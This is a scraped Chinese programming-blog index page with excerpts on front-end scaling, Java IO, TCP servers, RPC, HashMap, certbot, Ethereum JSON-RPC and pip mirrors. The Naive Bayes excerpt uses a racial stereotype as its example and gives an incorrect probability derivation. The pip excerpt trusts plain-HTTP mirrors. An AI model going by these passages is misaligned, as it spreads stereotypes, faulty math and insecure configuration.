var ratio = $(window).height() / 1080; console.log(ratio); $('body').css({ transform: "scale(" + ratio + ")", transformOrigin: "left top", backgroundSize: 100 * (window.screen.width / $(window).width() * ratio) + "%" + ' 100%', backgroundPosition: ($(window).width() - $('body').width() * ratio) / 2 + "px top", marginLeft: ($(window).width() - $('body').width() * ratio) / 2 }); 利用这个原理顺利完成了大屏的开发：效果还不错，暂时没有碰见坑！
效果如下：把浏览器缩到最小：
全屏情况下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/058f6ab7adb7820d5fea435ef716aef1/" rel="bookmark">
			IO应用——读取文本文件并统计单词个数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		读取一共文本文件，统计出其中每一个单词出现的次数，并把结果保存在另外的一个文件中
此处我的文本内容是：i love you,i love you
我就没有保存到另一个文件了，要保存直接用输出流就行了
public static void main(String[] args) throws IOException { Reader reader = new FileReader("C:/Users/maple/Desktop/itsourcejava/xx/d.txt"); Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); //正则不会写，只能写成这样了 //所有非字母出现一次或多次 String regex = "[^a-zA-z]+"; int n; //此处有bug，如果此数组长度写小了，结果就不一样 char[] ch = new char[1024]; while ((n = reader.read(ch)) != -1) { String string = new String(ch, 0, n); String[] split = string.split(regex); for (String s : split) { if (s.length()&gt;=1) { if (map.containsKey(s)) map.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/058f6ab7adb7820d5fea435ef716aef1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c37042b57643133752329f338b25ac98/" rel="bookmark">
			C语言网络编程-tcp服务器实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		5种io模型 tcp服务器分为了5种io复用模型,分别是:
阻塞io模型 非阻塞io模型
io复用
信号驱动io
异步io
本文会讲前面3种io模型的tcp服务器实现(本文只做tcp服务器实现,客户端逻辑处理,接收数据等缓冲区不做深入说明)
简单实现 首先，我们需要理解下tcp服务器的创建过程：
1:通过socket函数创建一个套接字文件
2:通过bind函数将本地一个地址和套接字捆绑
3:使用listen函数监听外部请求
4:使用accept函数接收外部请求
5:read,write,close 用于收,发,关闭客户端数据
好了,我们了解了tcp服务器的创建过程,就开始实现吧:
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c37042b57643133752329f338b25ac98/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2c878f7c6136c53636e57a67cce094f2/" rel="bookmark">
			solidworks草图阵列特征重新编辑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 solidworks草图阵列特征重新编辑 问题版本解决办法 问题 以前没注意过这种小问题，因为我通常用实体特征进行阵列；今天修改一个项目的参数，发现同学用的是草图阵列，我点进去修改时却找不到草图特征，而且也没从网上找到类似的问题，经过几次选择，找到了修改的地方。
版本 SolidWorks2018
解决办法 进入草图编辑
双击0标识
此时左侧状态栏会出现草图关系，单击陈列0进入编辑
完成 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/078201e6ce6c2a3638654629ea410e4d/" rel="bookmark">
			关于eclipse或myeclipse热部署jrebel的卸载/移除
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有些朋友在热部署后使用不方便或安装错误后，想对热部署进行卸载和移除，但是现在网上的教程较少，我就将我的方法发布出来，和大家共享
1、根据下面的图片步骤就可以顺利移除/卸载jrebel
如果是eclipse这是第一步骤
如果你是myeclipse，这是第一步骤和下一步
选择红框中的
下面的步骤eclipse和myeclipse都是相同的了 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d77526c79e32af1cefd7e4c71c81cd91/" rel="bookmark">
			Angular6 proxy.conf.json的配置生效及其步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、在angular6项目文件夹下（项目根目录）下新建 proxy.conf.json文件，里面代码如下：
{ "/api": { //访问以/api开头的接口，以下是要访问的端口 "target": "http://localhost:8000" }, "/list": { "target": "http://localhost:8081" } } 2、打开package.json，将配置的文件加入到启动文件中
将`
"start": "ng serve ", 改为
"start": "ng serve --proxy-config proxy.conf.json", 3、重新项目npm start即可访问http://localhost:8000下面api开头的接口
http://localhost:4200/api/product
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33c630ab3aa9c264eb2c7a29772f55aa/" rel="bookmark">
			9、如何理解应用层、传输层、网络层、链路层、物理层
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		举例分析 家庭：主机
进程：孩子们
信件：应用层报文
传输层协议：Bill和Ann
网络层协议：邮政服务
链路层协议：邮政传输使用的工具（汽车？飞机？）
有两个家庭，一个位于美国东海岸，一个位于美国西海岸，每家有12个孩子，东海岸家庭的孩子们是西海岸孩子们的堂兄弟姐妹。这两个家庭的孩子们喜欢彼此通信，每个人每星期要互相写一封信，每封信都用单独的信封通过传统的邮政服务传送，因此，每个家庭每星期要向另一家发送144封信。每一个家庭有个孩子负责收发邮件，西海岸家庭的是Ann，东海岸家庭是Bill。每星期Ann去她的所有兄弟姐妹那里收集信件，并将这些信件交到每天到家门口来的邮政服务的邮车里。当信件达到西海岸家庭时，Ann也负责将信件分发到她的兄弟姐妹手上。在东海岸家庭中的Bill也负责类似的工作。
分析：
孩子们写好了信件。就类比于进程（程序）产生了报文数据。写好了信件后，孩子们只需要等这Ann或Bill来收集信件。也就是说传输层会获取到应用层的报文信息。那么这个报文信息会怎么样呢？Ann或Bill会将信件交给邮政服务。这个邮政服务就相当于网络层，网络层的作用就是将报文进行传输。而传输的过程中，会遇到很多个中转站，网络层的底层作用就是如何选择下个中转站和整个路线。而链路层，就是信件在每个中转站的过程中使用的是哪种传输工具！
图解分析 应用层：
Message
传输层：
Message+源端口+目的端口
网络层：
Message+源端口+目的端口+源IP地址+目的IP地址
数据链路层：
Message+源端口+目的端口+源IP地址+目的IP地址+源MAC地址+目的MAC地址
1、确定了分组协议（以太网协议）
2、一组电信号构成一个数据包（一帧），每帧分为head和data两个部分。
3、head中包含了各种信息（发送者，接收者等）
4、mac地址：
所有数据包要发送必须经过网卡（从一个网卡到另一个网卡），而网卡会有一个地址，即mac地址。每块网卡的mac地址在出厂之前是唯一的（通过某些软件是可以修改的）
5、广播：
一块网卡是怎么知道另一块网卡的mac地址的呢？这里使用到了arp协议。
以太网数据包必须知道接收方的mac地址，数据包才能发送
物理层：
1、负责传输0和1这样的物理信号
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69896db399aa60ebde426301d7ffab11/" rel="bookmark">
			删除SQL架构的用户
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ALTER AUTHORIZATION ON SCHEMA::db_owner TO db_owner
转载于:https://www.cnblogs.com/LCX/p/10141626.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7692248466a35fbd69e4075b464c1d7a/" rel="bookmark">
			RPC基础入门：原理介绍和简单示例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、RPC
1. RPC是什么
2. 为什么要用RPC？ 二、RPC的原理和框架
三、Java中常用的RPC框架
四、RPC和消息队列的差异
五、RPC框架的核心技术点
六、RPC框架简易实现及其实例分析
七、关于RPC框架的若干问题说明
一、RPC 1. RPC是什么 RPC（Remote Procedure Call Protocol）——远程过程调用协议，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。
RPC采用客户机/服务器模式。请求程序就是一个客户机，而服务提供程序就是一个服务器。首先，客户机调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。
2. 为什么要用RPC？ 其实这是应用开发到一定的阶段的强烈需求驱动的。
1. 如果我们开发简单的单一应用，逻辑简单、用户不多、流量不大，那我们用不着；
2. 当我们的系统访问量增大、业务增多时，我们会发现一台单机运行此系统已经无法承受。此时，我们可以将业务拆分成几个互不关联的应用，分别部署在各自机器上，以划清逻辑并减小压力。此时，我们也可以不需要RPC，因为应用之间是互不关联的。
3. 当我们的业务越来越多、应用也越来越多时，自然的，我们会发现有些功能已经不能简单划分开来或者划分不出来。此时，可以将公共业务逻辑抽离出来，将之组成独立的服务Service应用 。而原有的、新增的应用都可以与那些独立的Service应用 交互，以此来完成完整的业务功能。所以此时，我们急需一种高效的应用程序之间的通讯手段来完成这种需求，所以你看，RPC大显身手的时候来了！
其实3描述的场景也是服务化 、微服务 和分布式系统架构 的基础场景。即RPC框架就是实现以上结构的有力方式。
二、RPC的原理和框架 Nelson 的论文中指出实现 RPC 的程序包括 5 个部分：
1. User
2. User-stub
3. RPCRuntime
4. Server-stub
5. Server
这 5 个部分的关系如下图所示
这里 user 就是 client 端，当 user 想发起一个远程调用时，它实际是通过本地调用user-stub。user-stub 负责将调用的接口、方法和参数通过约定的协议规范进行编码并通过本地的 RPCRuntime 实例传输到远端的实例。远端 RPCRuntime 实例收到请求后交给 server-stub 进行解码后发起本地端调用，调用结果再返回给 user 端。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7692248466a35fbd69e4075b464c1d7a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23a28772141fcd8fc6faa9cd00138bc6/" rel="bookmark">
			03、机器学习 （贝叶斯分类算法与应用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 朴素贝叶斯分类算法原理
1.1 概述
贝叶斯分类算法是一大类分类算法的总称
贝叶斯分类算法以样本可能属于某类的概率来作为分类依据
朴素贝叶斯分类算法是贝叶斯分类算法中最简单的一种
注：朴素的意思是条件概率独立性[此处要想真正理解，需要有概率论的基础知识
P(A|x1x2x3x4)=p(A|x1)*p(A|x2)p(A|x3)p(A|x4)则为条件概率独立
P(xy|z)=p(xyz)/p(z)=p(xz)/p(z)*p(yz)/p(z)]
1.2 算法思想
朴素贝叶斯的思想是这样的：
如果一个事物在一些属性条件发生的情况下，事物属于A的概率&gt;属于B的概率，则判定事物属于A
通俗来说比如，你在街上看到一个黑人，我让你猜这哥们哪里来的，你十有八九猜非洲。为什么呢？
在你的脑海中，有这么一个判断流程：
1、这个人的肤色是黑色 &lt;特征&gt;
2、黑色人种是非洲人的概率最高 &lt;条件概率：黑色条件下是非洲人的概率&gt;
3、没有其他辅助信息的情况下，最好的判断就是非洲人
这就是朴素贝叶斯的思想基础。
再扩展一下，假如在街上看到一个黑人讲英语，那我们是怎么去判断他来自于哪里？
提取特征：
肤色： 黑 语言： 英语
黑色人种来自非洲的概率： 80%
黑色人种来自于美国的概率：20%
讲英语的人来自于非洲的概率：10%
讲英语的人来自于美国的概率：90%
在我们的自然思维方式中，就会这样判断：
这个人来自非洲的概率：80% * 10% = 0.08
这个人来自美国的概率：20% * 90% =0.18
我们的判断结果就是：此人来自美国！
其蕴含的数学原理如下：
p(A|xy)=p(Axy)/p(xy)=p(Axy)/p(x)p(y)=p(A)/p(x)*p(A)/p(y)* p(xy)/p(xy)=p(A|x)p(A|y)
朴素贝叶斯分类器
朴素贝叶斯分类器的表示形式：
当特征为为x时，计算所有类别的条件概率，选取条件概率最大的类别作为待分类的类别。由于上公式的分母对每个类别都是一样的，因此计算时可以不考虑分母，即
朴素贝叶斯的朴素体现在其对各个条件的独立性假设上，加上独立假设后，大大减少了参数假设空间。　1.3 算法要点
1.3.1 算法步骤
1、分解各类先验样本数据中的特征
2、计算各类数据中，各特征的条件概率
（比如：特征1出现的情况下，属于A类的概率p(A|特征1)，属于B类的概率p(B|特征1)，属于C类的概率p(C|特征1)......）
3、分解待分类数据中的特征（特征1、特征2、特征3、特征4......）
4、计算各特征的各条件概率的乘积，如下所示：
判断为A类的概率：p(A|特征1)*p(A|特征2)*p(A|特征3)*p(A|特征4).....
判断为B类的概率：p(B|特征1)*p(B|特征2)*p(B|特征3)*p(B|特征4).....
判断为C类的概率：p(C|特征1)*p(C|特征2)*p(C|特征3)*p(C|特征4).....
......
5、结果中的最大值就是该样本所属的类别
1.3.2 算法应用举例
1、衣服质量太差了！！！！颜色根本不纯！！！
2、我有一有种上当受骗的感觉！！！！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23a28772141fcd8fc6faa9cd00138bc6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02d58a16202966a1521b756907af446f/" rel="bookmark">
			为什么HashMap集合的初始大小是16？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如果两个元素不相同,但是hash函数的值相同,这两个元素就是一个碰撞
因为把任意长度的字符串变成固定长度的字符串,所以存在一个hash对应多个字符串的情况,所以碰撞必然存在
为了减少hash值的碰撞,需要实现一个尽量均匀分布的hash函数,在HashMap中通过利用key的hashcode值,来进行位运算
公式:index = e.hash &amp; (newCap - 1)
举个例子:
1.计算"book"的hashcode
十进制 : 3029737
二进制 : 101110001110101110 1001
2.HashMap长度是默认的16，length - 1的结果
十进制 : 15
二进制 : 1111
3.把以上两个结果做与运算
101110001110101110 1001 &amp; 1111 = 1001
1001的十进制 : 9,所以 index=9
hash算法最终得到的index结果,取决于hashcode值的最后几位
为了推断HashMap的默认长度为什么是16
现在,我们假设HashMap的长度是10,重复刚才的运算步骤:
hashcode : 101110001110101110 1001
length - 1 : 1001
index : 1001
再换一个hashcode 101110001110101110 1111 试试:
hashcode : 101110001110101110 1111
length - 1 : 1001
index : 1001
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/02d58a16202966a1521b756907af446f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1776e8cce5f88f9560cae0d36fdf27bf/" rel="bookmark">
			The Science of the Blockchain笔记（七）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		The Science of the Blockchain笔记（七） 分布式存储一致性哈希（Consistent Hashing）超立方体网络（Hypercubic Networks）DHT &amp; Churn 分布式存储 如果将100万部1GB大小的的电影，储存在100万个节点上（每个节点存储空间1TB），一个简单的方法是将文件随意的存储在不同的节点上，并采用一个全局的索引记录每个电影存放位置。但这带来的问题是，如果电影和节点频繁改变，这个索引就需要频繁的进行修改，为了避免这个问题，我们开始接下来的内容。
一致性哈希（Consistent Hashing） 以下算法可以解决这个问题：
定理 8.2（一致性哈希） 按照算法8.1的策略，每个节点存放的电影数的平均期望为km/n。
做一个简单的计算，现在又 m=1M 电影（每部 1GB），n=1M 节点，这每个节点可以存储 1TB/1GB=1K 部电影。这样我们可以采用 k=1K 哈希函数。根据定理 8.2，每个节点平均存储大约 1K 部电影。根据下面的切诺夫界，并且有 u=km/n=1K，我们可以得出结论：一个节点所使用的存储空间超出平均期望 10% 的概率小于 1%。
事实8.3 根据某个版本的 *Chernoff Bound，我们有：若 x1, …, xn 是独立同分布的随机变量，且均服从下面的伯努利分布（Independent Bernoulli-Distributed Random Variables）: Pr ⁡ [ x i = 1 ] = p i \operatorname { Pr } \left[ x _ { i } = 1 \right] = p _ { i } Pr[xi​=1]=pi​ and Pr ⁡ [ x i = 0 ] = 1 − p i = q i \operatorname { Pr } \left[ x _ { i } = 0 \right] = 1 - p _ { i } = q _ { i } Pr[xi​=0]=1−pi​=qi​，则对 X : = ∑ i = 1 n x i X : = \sum _ { i = 1 } ^ { n } x _ { i } X:=∑i=1n​xi​ 以及 μ : = E [ X ] = ∑ i = 1 n p i \mu : = \mathbb { E } [ X ] = \sum _ { i = 1 } ^ { n } p _ { i } μ:=E[X]=∑i=1n​pi​，有如下关系：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1776e8cce5f88f9560cae0d36fdf27bf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84fe0e6dd39713ec42fcbd600dc19a33/" rel="bookmark">
			QT的QTableWidget的基本属性应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QT的QTableWidget的常用属性操作：
1.平均分配列宽和行宽
ui-&gt;tableWidget-&gt;horizontalHeader()-&gt;setSectionResizeMode(QHeaderView::Stretch); //平均分配列宽
ui-&gt;tableWidget-&gt;verticalHeader()-&gt;setSectionResizeMode(QHeaderView::Stretch);//平均分配行宽
ui-&gt;tableWidget-&gt;horizontalHeader()-&gt;setStretchLastSection(true); //最后一列自动扩充至最右端
ui-&gt;tableWidget-&gt;horizontalHeader()-&gt;resizeSections(QHeaderView::ResizeToContents);//按单元格中的内容长度分配宽度
2.QTableWidget 的内容居中，居左，自适应等。
ui-&gt;tableWidget-&gt;item(row,column)-&gt;setTextAlignment(Qt::AlignCenter);//item的内容居中
ui-&gt;tableWidget-&gt;horizontalHeader()-&gt;setDefaultAlignment (Qt::AlignLeft | Qt::AlignVCenter); //tablewidget表头居左，item同理
3.QTableWidget 插入qpushbutton等控件 QPushButton *button = new QPushButton;
ui-&gt;tableWidget-&gt;setCellWidget(row,column,button); //插入其他控件同理
4.QTableWidget的操作
a.合并单元格
ui-&gt;tableWidget-&gt;setSpan(row,col,row_num,col_num);//前两个参数指定合并起始单元格，为起始单元格的行号列号，后两个为从起始位置开始合并的行数和列数。行列数包含起始的一格。
b.设置QTableWidget内容不可编辑
ui-&gt;tableWidget-&gt;setEditTriggers(QAbstractItemView::NoEditTriggers);
c.设置QTabelWidget选中一行或多个
ui-&gt;tableWidget-&gt;setSelectionBehavior ( QAbstractItemView::SelectRows); //设置选择行
ui-&gt;tableWidget-&gt;setSelectionMode(QAbstractItemView::ExtendedSelection); //设置允许多个选中
d.设置QTableWidget内容升序降序
ui-&gt;tableWidget-&gt;sortItems(column,Qt::AscendingOrder);//指定列根据内容升序，Qt::DescendingOrder为降序
e.行列头隐藏
ui-&gt;tableWidget-&gt;horizontalHeader()-&gt;setVisible(false); //隐藏列表头
ui-&gt;tableWidget-&gt;verticalHeader()-&gt;setVisible(false); //隐藏行表头
后续持续更新………………
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1f32d89cce616dfd20b42cb27b3b518/" rel="bookmark">
			域名在80端口无法访问的情况下通过certbot生成证书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、下载certbot-auto,请大家自行百度 2、通过修改dns记录的方式申请证书 sudo certbot-auto certonly --manual --preferred-challenge dns -d www.xxx.com(www.xxx.com替换成自己的域名) 执行完上述命令后，会告知你会记录你的IP，选择Y 信息如下： NOTE: The IP of this machine will be publicly logged as having requested this certificate. If you're running certbot in manual mode on a machine that is not your server, please ensure you're okay with that. Are you OK with your IP being logged? - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (Y)es/(N)o: Y（这里选择Yes） - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 3、接着会出现一个提示，要你把_acme-challenge.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f1f32d89cce616dfd20b42cb27b3b518/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9f6a129f6e59cfd3e982f06eaf3b90c/" rel="bookmark">
			ShaderForge生长动画——基于模型UV生长
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		通过ShaderForge制作一个模型出场的Shader，具体效果如下：
效果图 这种模型自下而上的出场效果有一下集中方法可以实现：
1使用遮罩材质覆盖模型，控制遮罩动画
2使用shdaerForge基于模型UV控制模型显示
3使用shaderForge基于模型位置控制模型显示
本文中具体介绍第二种实现方法，与大部分溶解消散的效果类似，控制模型消失的重要节点是OpacityClip（不透明度剪切）节点，还有一个要点，通过UV控制模型自下而上溶解需要一张Front/Back角度的UV，模型本身的UV一般并不是符合要求的，所以需要在Maya或者Max里面给模型添加UV。
一、在Maya中添加UV
首先将模型导入Maya，在Modeling模式下打开UV——UV Set Editor,可以看到模型本身就有三套UV了，
还需要添加一套控制模型变化，New之后选择Planar控制以Z轴平面展UV，
这样模型就多了一套正视图角度的UV完成之后导出文件，导入Unity。
二、ShaderForge编辑
首先创建一个PRBshader
上面中说到要做的溶解效果和火焰消散的溶解同理，1OpacityClip节点中使用噪波控制消散2Emission节点添加颜色控制消散的边缘过渡。
1创建UV节点和Slider控制模型从上向下消失,UV节点中的UV选项一定要选择对应的就是刚刚展开的那套正视图UV，在列表中表示为UV3，输出V方向的数据使模型上下垂直方向的渐变，U方向则是左右水平方向的变化。
2添加噪波贴图控制过渡边缘
3具体节点如下图
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3778f470260030e6e7e607b2c19aec3/" rel="bookmark">
			以太坊应用开发接口：JSON RPC API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019独角兽企业重金招聘Python工程师标准&gt;&gt;&gt; 以太坊应用开发接口指的是以太坊节点软件提供的API接口，去中心化应用可以利用这个接口访问以太坊上的智能合约。以太坊应用开发接口采用JSON-PRC标准，通常是通过HTTP或websocket提供给应用程序调用。
JSON-RPC是一种无状态轻量级远程过程调用（RPC）协议，规范定义了数据结构及相应的处理规则,规范使用JSON（RFC 4627）数据格式，规范本身是传输无关的，可以用于进程内通信、socket套接字、HTTP 或各种消息通信环境。
以太坊应用开发接口的配置
不同节点软件的应用开发接口访问点可能有所区别。常见以太坊节点软件的的默认JSON-RPC端结点如下：
Geth - http://localhost:8545Parity - http://localhost:8545Pytheapp - http://localhost:4000 以最常见的geth节点软件为例，可以使用--rpc选项启动其基于HTTP的JSON-RPC应用开发接口。
~$ geth --rpc 可以使用--rpcaddr和--rpcport选项修改默认的监听端口(8545)和监听地址(localhost)：
~$ geth --rpc --rpcaddr &lt;ip&gt; --rpcport &lt;portnumber&gt; 如果需要从浏览器中访问RPC接口，需要正确设置CORS，否则由于同源策略的限制，javascript调用将失败：
~$ geth --rpc --rpccorsdomain "http://localhost:3000" 也可以在geth控制台使用admin.startRPC(addr,port)命令来启动JSON RPC。
以太坊应用开发接口的调用
利用标准的HTTP协议就可以调用以太坊应用开发接口，例如在命令行可以使用curl工具：
~$ curl -X POST --data '{"jsonrpc":"2.0","method":"web3_clientVersion","params":[],"id":67}' http://127.0.0.1:8545 你可以点击这里查看以太坊应用开发接口中文手册。
以太坊应用开发接口的封装开发包
为便于在不同语言的代码中调用以太坊应用开发接口，以太坊社区涌现了不同语言的开发包，例如：
javascript：Web3.js，教程：以太坊Dapp开发入门php：Web3.php， 教程：php以太坊开发详解python：Web3.py，教程：python以太坊开发详解java：Web3j，教程：Web3j以太坊开发详解c#：Nethereum，教程：c#以太坊开发详解 可以根据你的需要选择合适的开发包来调用以太坊应用开发接口，这样可以大大缩短对接以太坊 节点的所需要的时间。
原文链接：以太坊应用开发接口
转载于:https://my.oschina.net/u/3794778/blog/2989096
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/09ffbb3a35186e023b3872bd23f0baec/" rel="bookmark">
			初学者必须C语言开始吗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		初学者必须C语言开始吗？
建议从C语言开始，然后学习数据结构、算法、内存、线程、进程、通信、操作系统等基本的概念，它们是学习编程的基础，不管是应用层开发还是底层开发，这些知识都是必须的。
如果你非要跳过C语言，从其他语言开始，比如 Java、Python、PHP、JavaScript、C# 等，也不是不可以；但是，在学习的过程中你会有一种雾里看花、空中楼阁的感觉，很多东西只会用，却理解不了，深入不了，原因就是没有计算机基础，没学会走就想跑了，这个时候，还得老老实实回来学习C语言。
如何学习底层知识
关于数据结构、算法、内存、线程、进程、通信、操作系统等这些基本的知识，重要的是理解概念，知道计算机是怎么回事，千万不要深入细节，把自己绕进去，耽误一两年的功夫，要尽早跳出来去做应用开发，找到兴趣点，获得成就感。
这个时候，C语言主要的作用是让你入门，了解编程语言的基本语法，强化编程思维，学习计算机底层知识，为以后的职业生涯打下坚实的基础，而不是用它来做实际开发。
在实际开发中，遇到问题，或者哪里理解不透了，可以再来回顾这些底层知识，这个时候就可以深入细节了。因为有了实际开发经验，再学习底层知识就知道哪里是重点了，不会像无头的苍蝇一样乱飞，什么都学。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b2ce045e717a43011baa06db4a096e3/" rel="bookmark">
			linux平台修改pip源
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 方法一：临时修改 # 在pip后指定源 pip install ipython -i http://mirrors.aliyun.com/pypi/simple/ 方法二：永久修改 # 找到~/.pip/pip.conf,如果不存在就创建 # 加入 [global] timeout = 10 # 设置超时，单位s index-url = http://mirrors.aliyun.com/pypi/simple/ # 指定优先下载源 extra-index-url= http://pypi.douban.com/simple/ # 第二下载源 [install] trusted-host= # 可能需要使用https方式通信 mirrors.aliyun.com pypi.douban.com pip install xxx报错的话，将注释去掉，因为懒得去修改编码格式。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe195257a4f7232fdc35d617dc967e93/" rel="bookmark">
			大学计算机专业实习报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、实习目的 加强计算机计算机学院全体同学对未来就业方向的认知度，对自己的未来有一个明确的规划，同时加强计算机学院同学的社会实践能力，对自己所学专业领域的知识有一个大概的认知范围；在实践中锻炼自己的能力，创造一个在实际环境中学习相关领域知识的条件，同时也为赢得一个与企业人员间的交流，为之后的就业做准备，计算机学院老师和各大企业组织了本次充实而有意义的计算机科学与技术认知实习。认知实习，了解我们专业在未来的发展趋势，通过观看公司的介绍和技术发展情况招聘信息，后的感想和学习体会等多种方式，使我们了解本专业相关领域的发展现状。了解计算机、网络通信等相关领域的发展现状和最新科研成果，以及在生产科研中的应用；巩固学生的理论知识，培养实践能力、创新能力，拓宽视野，树立努力学习专业知识的信心，并为学习后续课程打下一定的实践基础；增强动手上机实践能力的观念，树立正确的劳动观和价值观。实地探访，对自己的未来有大致的定位。
二、实习时间 2018年12月11日
三、实习单位 拓维信息系统股份有限公司
道通科技股份有限公司
四、实习过程 上午九点二十到达拓维信息系统股份有限公司，在拓维信息系统股份有限公司接待人的带领下所有同学一同参观了拓维信息系统股份有限公司的员工休息室。毕竟是一间上市的大公司，在员工待遇等方面都不错，员工休息室和咖啡厅还有露天阳台都别具一格。之后参观了三楼的办公区，这里的办公区域是开放式的，没有用其它东西将每个员工分开，有利于员工之间的交流。参观完拓维的员工办公区，从楼道看到了维拓的小组开总结会的情况，看着师兄师姐办公，对自己的未来超级期待。在完成了所有的参观之后，我们到了拓维的一楼会议室，公司的讲解员通过宣讲的方式让我们了解了有关拓维信息系统有限公司的情况以及之后的就业情况。讲解员介绍到拓维公司在2008年就上市了，他们主打的业务是互联网加教育，这一板块在他们公司的业务占了80%左右，他们还成立了多所研究院。软件业务主营企业管理软件、大数据软件、互联网家政有关软件等等。之后毕业于湖南科技大学合并以来的第一届计算机专业，现任拓维信息系统有限公司人力资源经理的师兄对我们各项有关知识进行了简单的讲解，同时有相关为题的同学对师兄的讲解进行提问，师兄也做了有关的详细回答。左后在带队老师和负责本次实习的老师的发言总结中上午的认知实习告一段落。大家赶往附近就餐。下午两点半左右我们到达了道通科技股份有限公司。这个公司给人的整体印象是比较的正式，在视觉上和视觉舒适度上感觉没有早上的拓维那样好。但是这里的办公环境也是绝对可以。通过简单的介绍我们了解到这是一家主营汽车测试软降和硬件的公司。开发营销的产品主要基于传感器的汽车各项性能测试。相比较与早上的拓维公司，道通公司的各项开发更加偏向于硬件。而且两所公司开发所用的语言也有不同，拓维的开发语言主要是java，而道通的主要为C++。刚到道通，公司的负责带队的师兄师姐首先带我们到了道通的员工餐厅，这里的设施真的不错，听他们们介绍，员工还有自己的寝室。设施都不错。其次我们参观了道通的荣誉厅，这里陈列着道通的各种奖状和软件硬件著作专利证书等各项荣誉。除此之外展厅里面还有公司研发的各种设备，从示波器到胎压监测装置，再到轿车、汽车监测装置等等。都是他们公司自主研发的，而且是软硬件一条龙。进行了简单的参观之后我们去了会议室听宣讲。这里的会议室相比较于拓维的更大也更有气势。公司的员工还精心为每个同学准备了水和水果。从这一点可以看出道通对员工的待遇是相当不错的。
